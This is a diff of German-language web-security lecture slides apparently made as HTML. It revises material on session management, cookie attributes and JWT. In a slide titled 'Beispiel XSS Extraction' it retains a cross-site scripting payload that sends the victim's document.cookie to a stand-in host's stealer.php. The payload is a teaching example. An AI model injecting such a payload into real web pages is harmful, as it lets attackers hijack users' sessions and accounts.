@@ -106,28 +106,25 @@
 <section>
 <section id="session-management" class="title-slide slide level1">
 <h1>Session Management</h1>
-
-</section>
-<section id="warum-session-management" class="slide level2">
-<h2>Warum Session-Management?</h2>
 <ul>
-<li>Etablierung einer Benutzeridentität über mehrere Requests hinweg</li>
-<li>HTTP selbst ist stateless</li>
-<li>Session wird zumeist über Cookies oder Tokens gebaut</li>
+<li>Recap: <a href="https://andreashappe.github.io/lecture-web-security/build/0x03_web_applications.md.html#/sessions">Warum Sessions?</a></li>
 </ul>
 </section>
-<section id="session-ablauf" class="slide level2">
-<h2>Session-Ablauf</h2>
+<section id="gewünschter-session-ablauf" class="slide level2">
+<h2>Gewünschter Session-Ablauf</h2>
 <ul>
-<li>Während des Logins wird ein neues Session Token/Cookie generiert</li>
+<li>Während des Logins wird ein neues Session-Token/Cookie generiert</li>
 <li>Bei jedem Folge-Zugriff wird über dieses Token an den Server übertragen</li>
-<li>Die Benutzeridentität wird geprüft</li>
+<li>(Die Benutzeridentität wird geprüft)</li>
 <li>Beim Logout wird das Token im Browser gelöscht und am Server als inaktiv vermerkt</li>
 <li>Logout aller Sessions sollte möglich sein</li>
 </ul>
 </section>
 <section id="client-vs.-server-side-session" class="slide level2">
 <h2>Client vs. Server-Side Session</h2>
+<ul>
+<li>Mit Cookies können unterschiedliche Systeme gebaut werden</li>
+</ul>
 </section>
 <section id="client-seitig" class="slide level2">
 <h2>Client-Seitig</h2>
@@ -147,8 +144,8 @@
 </ul>
 </section></section>
 <section>
-<section id="session-möglichkeiten" class="title-slide slide level1">
-<h1>Session Möglichkeiten</h1>
+<section id="session-technologien" class="title-slide slide level1">
+<h1>Session-Technologien</h1>
 
 </section>
 <section id="cookie-based-sessions" class="slide level2">
@@ -159,10 +156,18 @@
 <li>Möglichkeit des Session-Timeouts und optionale Security-Flags</li>
 </ul>
 </section>
+<section id="cookie-beispiele" class="slide level2">
+<h2>Cookie-Beispiele</h2>
+<pre class="http"><code>Set-Cookie: sessionid1=0xbadc0ffee;
+Set-Cookie: sessionid2=0xbadc0ffee;Max-Age=42;
+Set-Cookie: sessionid3=0xbadc0ffee;Secure;HttpOnly;SameSite=Lax
+Set-Cookie: sessionid4=0xbadc0ffee;Path=/
+Set-Cookie: sessionid4=0xbadc0ffee;Path=/;Domain=snikt.net</code></pre>
+</section>
 <section id="client-side-jwt" class="slide level2">
 <h2>Client-Side: JWT</h2>
 <ul>
-<li>JSON Web Token: Token-Format inkl. Integritätsschutz</li>
+<li><a href="https://jwt.io">JSON Web Token</a>: Token-Format inkl. Integritätsschutz</li>
 <li>Server überträgt signiertes Token an Client</li>
 <li>Das Token enthält Zugriffsberechtigungen</li>
 <li>Sollte Datenbankabfragen am Server beim Zugriff vermeiden</li>
@@ -268,8 +273,8 @@ Set-Cookie: CookieName=Wert; path=/; secure</code></pre>
 </section>
 <section id="beispiel-xss-extraction" class="slide level2">
 <h2>Beispiel XSS Extraction</h2>
-<div class="sourceCode" id="cb2"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true"></a><span class="kw">&lt;script&gt;</span>location<span class="op">.</span><span class="at">href</span> <span class="op">=</span> <span class="st">&#39;http://xyz.com/stealer.php?cookie=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">;</span></span>
-<span id="cb2-2"><a href="#cb2-2" aria-hidden="true"></a><span class="kw">&lt;/script&gt;</span></span></code></pre></div>
+<div class="sourceCode" id="cb3"><pre class="sourceCode html"><code class="sourceCode html"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true"></a><span class="kw">&lt;script&gt;</span>location<span class="op">.</span><span class="at">href</span> <span class="op">=</span> <span class="st">&#39;http://xyz.com/stealer.php?cookie=&#39;</span><span class="op">+</span><span class="bu">document</span><span class="op">.</span><span class="at">cookie</span><span class="op">;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true"></a><span class="kw">&lt;/script&gt;</span></span></code></pre></div>
 </section>
 <section id="lösung-für-xss-lücke" class="slide level2">
 <h2>Lösung für XSS-Lücke</h2>
